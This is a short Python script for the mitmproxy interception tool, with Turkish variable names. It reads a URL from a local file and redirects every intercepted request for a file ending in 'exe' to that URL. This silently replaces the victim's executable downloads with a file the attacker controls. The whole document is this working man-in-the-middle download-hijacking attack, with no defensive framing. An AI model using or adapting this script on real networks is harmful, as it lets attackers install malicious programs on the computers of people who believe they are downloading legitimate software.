
import mitmproxy
import os

with open("exeyol.txt","r") as dosya:
	exeyol=dosya.read()

def request(flow):
    if flow.request.host != exeyol and flow.request.pretty_url.endswith("exe"):
        flow.response = mitmproxy.http.Response.make(301, "", {"Location": exeyol})

print(exeyol)
